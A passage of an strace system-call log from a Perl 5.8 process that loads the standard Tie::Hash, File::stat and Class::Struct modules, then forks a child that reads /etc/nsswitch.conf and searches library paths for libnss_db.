{warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
7695  07:19:58.143257 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
7695  07:19:58.143832 read(8, "", 4096) = 0
7695  07:19:58.143847 close(8)          = 0
7695  07:19:58.143877 stat64("/etc/perl/File/stat.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.143892 stat64("/etc/perl/File/stat.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.143905 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.143918 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.143931 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.143944 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.143983 stat64("/usr/lib/perl5/File/stat.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144035 stat64("/usr/lib/perl5/File/stat.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144049 stat64("/usr/share/perl5/File/stat.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144081 stat64("/usr/share/perl5/File/stat.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144094 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144107 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144120 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144133 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
7695  07:19:58.144154 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.144168 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.144179 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.144196 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
7695  07:19:58.144685 stat64("/etc/perl/Class/Struct.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144703 stat64("/etc/perl/Class/Struct.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
7695  07:19:58.144717 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144730 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
7695  07:19:58.144744 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144757 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
7695  07:19:58.144770 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144782 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
7695  07:19:58.144795 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144807 stat64("/usr/share/perl5/Class/Struct.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
7695  07:19:58.144820 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144833 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
7695  07:19:58.144847 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.144860 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
7695  07:19:58.144881 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
7695  07:19:58.144895 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa00b8) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.144907 _llseek(10, 0, [0], SEEK_CUR) = 0
7695  07:19:58.144926 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
7695  07:19:58.145349 brk(0x82de000)    = 0x82de000
7695  07:19:58.145764 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
7695  07:19:58.146344 _llseek(10, 6916, [6916], SEEK_SET) = 0
7695  07:19:58.146360 _llseek(10, 0, [6916], SEEK_CUR) = 0
7695  07:19:58.146371 close(10)         = 0
7695  07:19:58.146585 _llseek(8, 1334, [1334], SEEK_SET) = 0
7695  07:19:58.146601 _llseek(8, 0, [1334], SEEK_CUR) = 0
7695  07:19:58.146611 close(8)          = 0
7695  07:19:58.147256 brk(0x82ff000)    = 0x82ff000
7695  07:19:58.147398 _llseek(6, 2689, [2689], SEEK_SET) = 0
7695  07:19:58.147413 _llseek(6, 0, [2689], SEEK_CUR) = 0
7695  07:19:58.147423 close(6)          = 0
7695  07:19:58.147661 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dcd908) = 7696
7696  07:19:58.147748 getppid()         = 7695
7696  07:19:58.148264 open("/etc/nsswitch.conf", O_RDONLY) = 6
7696  07:19:58.159953 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
7696  07:19:58.160055 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f93000
7696  07:19:58.160101 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
7696  07:19:58.160175 read(6, "", 4096) = 0
7696  07:19:58.160197 close(6)          = 0
7696  07:19:58.160214 munmap(0xb7f93000, 4096) = 0
7696  07:19:58.160243 open("/etc/ld.so.cache", O_RDONLY) = 6
7696  07:19:58.160257 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7696  07:19:58.160274 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d9a000
7696  07:19:58.160285 close(6)          = 0
7696  07:19:58.160296 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7696  07:19:58.160314 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160329 stat64("/lib/tls/i686/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160343 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160356 stat64("/lib/tls/i686/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160368 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160381 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7696  07:19:58.160399 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160411 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7696  07:19:58.160429 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160441 stat64("/lib/tls/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160452 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160555 stat64("/lib/tls/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160566 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160578 stat64("/lib/tls/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160590 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160601 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7696  07:19:58.160618 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160631 stat64("/lib/i686/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160642 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160654 stat64("/lib/i686/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160664 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160676 stat64("/lib/i686/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160687 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160699 stat64("/lib/i686", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160711 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160723 stat64("/lib/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160734 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160745 stat64("/lib/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160756 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160768 stat64("/lib/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160782 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160793 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7696  07:19:58.160810 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160823 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160835 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160847 stat64("/usr/lib/tls/i686/sse2", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
7696  07:19:58.160859 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
7696  07:19:58.160871 stat64("/usr/lib/tls/i686/cmov", 0xbffa0c3c) = -1 ENOENT (No such file or directory)
